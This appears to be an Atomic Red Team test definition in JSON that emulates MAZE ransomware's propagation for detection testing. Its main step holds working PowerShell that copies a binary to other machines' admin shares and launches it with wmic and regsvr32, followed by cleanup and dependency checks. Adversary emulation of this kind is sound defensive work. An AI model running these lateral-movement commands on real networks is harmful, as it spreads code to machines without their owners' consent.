{
  "id": "70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf",
  "name": "MAZE Propagation Script",
  "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "3c53c4c9-f256-4ee8-a698-93d5dd28ab94",
      "type": "execute-command",
      "data": {
        "command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\" \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine \u003e\u003e \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine \u003e\u003e \"$offline_list\"}}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "65b1d8fc-970e-4966-944a-15e331b0b5e0",
      "type": "execute-command",
      "data": {
        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "25b9fd43-ed36-42eb-b80e-f629c19f46c9",
      "name": "Check dependency 1/2",
      "description": "Binary file must exist at specified location (#{binary_file})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path #{binary_file}) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "2b0dfa2a-4dc8-4860-8962-bcf876a74318",
      "name": "Resolve dependency 1/2",
      "description": "Binary file must exist at specified location (#{binary_file})\n",
      "type": "execute-command",
      "data": {
        "command": "write-host \"The binary_file input parameter must be set to a binary that exists on this computer.\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "327fafbd-b62e-43ff-ae9d-5de11555bfc1",
      "name": "Re-check dependency 1/2",
      "description": "Binary file must exist at specified location (#{binary_file})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path #{binary_file}) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "e7b9044f-c4a4-46e3-9f69-1ec6bc62e0a7",
      "name": "Check dependency 2/2",
      "description": "Machine list must exist at specified location (\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\")\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "1417104b-8347-4edd-896f-3df73e613f4b",
      "name": "Resolve dependency 2/2",
      "description": "Machine list must exist at specified location (\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\")\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nnew-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\" | Out-Null\necho \"A machine list file has been generated at \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\". Please enter the machines to target there, one machine per line.\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0b05e2c5-dacd-4c0f-86fc-6053db681544",
      "name": "Re-check dependency 2/2",
      "description": "Machine list must exist at specified location (\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\")\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "3c53c4c9-f256-4ee8-a698-93d5dd28ab94",
      "p": "on-success",
      "o": "65b1d8fc-970e-4966-944a-15e331b0b5e0"
    },
    {
      "s": "3c53c4c9-f256-4ee8-a698-93d5dd28ab94",
      "p": "on-failure",
      "o": "65b1d8fc-970e-4966-944a-15e331b0b5e0"
    },
    {
      "s": "25b9fd43-ed36-42eb-b80e-f629c19f46c9",
      "p": "on-success",
      "o": "3c53c4c9-f256-4ee8-a698-93d5dd28ab94"
    },
    {
      "s": "25b9fd43-ed36-42eb-b80e-f629c19f46c9",
      "p": "on-failure",
      "o": "2b0dfa2a-4dc8-4860-8962-bcf876a74318"
    },
    {
      "s": "2b0dfa2a-4dc8-4860-8962-bcf876a74318",
      "p": "on-success",
      "o": "327fafbd-b62e-43ff-ae9d-5de11555bfc1"
    },
    {
      "s": "327fafbd-b62e-43ff-ae9d-5de11555bfc1",
      "p": "on-failure",
      "o": "3c53c4c9-f256-4ee8-a698-93d5dd28ab94"
    },
    {
      "s": "e7b9044f-c4a4-46e3-9f69-1ec6bc62e0a7",
      "p": "on-success",
      "o": "3c53c4c9-f256-4ee8-a698-93d5dd28ab94"
    },
    {
      "s": "e7b9044f-c4a4-46e3-9f69-1ec6bc62e0a7",
      "p": "on-failure",
      "o": "1417104b-8347-4edd-896f-3df73e613f4b"
    },
    {
      "s": "1417104b-8347-4edd-896f-3df73e613f4b",
      "p": "on-success",
      "o": "0b05e2c5-dacd-4c0f-86fc-6053db681544"
    },
    {
      "s": "0b05e2c5-dacd-4c0f-86fc-6053db681544",
      "p": "on-failure",
      "o": "3c53c4c9-f256-4ee8-a698-93d5dd28ab94"
    }
  ],
  "tags": [
    "T1105",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "binary_file",
      "type": "string",
      "description": "Binary file to copy to remote machines",
      "value": "$env:comspec"
    },
    {
      "name": "exe_remote_folder",
      "type": "string",
      "description": "Path to store executable on remote machine (no drive letter)",
      "value": "\\Windows\\Temp\\T1105.exe"
    },
    {
      "name": "remote_drive_letter",
      "type": "string",
      "description": "Remote drive letter",
      "value": "C"
    }
  ]
}